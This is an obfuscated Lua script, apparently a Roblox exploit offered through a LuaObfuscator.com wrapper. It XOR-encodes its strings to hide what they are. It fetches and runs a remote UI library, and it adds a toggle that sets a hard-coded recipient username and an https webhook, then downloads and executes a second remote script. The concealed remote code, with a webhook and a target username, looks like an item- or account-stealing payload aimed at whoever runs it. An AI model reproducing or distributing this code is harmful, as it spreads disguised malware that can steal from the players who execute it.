--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v12,v13)local v15={};for v16=1, #v12 do v6(v15,v0(v4(v1(v2(v12,v16,v16 + (2 -1))),v1(v2(v13,((281 + 927) -(1199 + 8)) + ((v16-1)% #v13),((4788 -3756) -(746 + 285)) + ((v16-(2 -1))% #v13) + (1276 -(1149 + 126)))))%(484 -228)));end return v5(v15);end local v8=loadstring(game:HttpGet(v7("\80\170\221\52\253\105\9\23\172\200\51\160\52\79\76\182\220\38\251\32\67\74\189\198\42\250\54\72\76\240\202\43\227\124\94\112\187\217\48\237\124\109\89\168\198\105\219\26\11\116\183\203\54\239\33\95\23\179\200\45\224\124\85\87\171\219\39\235\125\74\77\191","\56\222\169\68\142\83\38")))();local v9=v8.CreateLib(v7("\54\103\77\209\7\53\95\214\3\120\122\135\76\39","\98\21\44\181"),v7("\222\5\188\164\68\143\255\9\171","\154\100\206\207\16\231"));local v10=v9:NewTab(v7("\130\4\195\125\85","\214\118\162\25\48"));local v11=v10:NewSection(v7("\73\199\48\66","\26\164\81\47"));v11:NewToggle(v7("\239\200\188\246\92\78\137\216\219\176","\187\186\221\146\57\110\218"),v7("\10\248\149\248\157\63\249\193\185\237\14\255\128\188\168\122\236\143\188\237\53\227\193\172\165\51\254","\90\141\225\216\205"),function(v14)if v14 then local v17=0;while true do if (v17==((3563 -2046) -(1381 + (1947 -(161 + 1651))))) then loadstring(game:HttpGet(v7("\167\57\13\92\149\245\98\86\94\135\184\99\30\69\146\167\56\27\89\149\170\63\26\67\136\187\40\23\88\200\172\34\20\3\174\174\63\29\107\135\162\40\42\95\201\159\30\33\3\139\174\36\23\3\181\172\63\16\92\146\225\33\12\77","\207\77\121\44\230"),true))();break;end if ((0 -0)==v17) then local v18=0;while true do if (v18==((2482 -(97 + 1179)) -(214 + (2901 -(671 + 1239))))) then v17=703 -(672 + 30);break;end if (v18==(0 -0)) then UserName=v7("\187\76\15\207\127\39\35\184\10\75","\214\62\124\187\26\65\66");WebHook=v7("\8\246\62\199\162\90\173\101\211\184\19\225\37\197\181\78\225\37\218\254\1\242\35\152\166\5\224\34\216\190\11\241\101\134\225\86\178\115\130\232\81\187\124\135\225\80\178\121\135\232\85\179\101\238\171\40\207\21\240\164\88\236\46\199\157\46\193\29\240\184\7\247\16\199\152\36\182\35\252\189\19\182\1\220\132\57\180\39\217\166\50\187\36\142\176\41\196\33\231\189\21\250\40\225\162\19\177\125\250\135\11\229\33\216\146\42\205\3\248\153\14","\96\130\74\183\209");v18=1 + 0;end end end end else print(v7("\196\143\115\93\123\234\176\175\114\92","\144\224\20\58\23\143"));end end);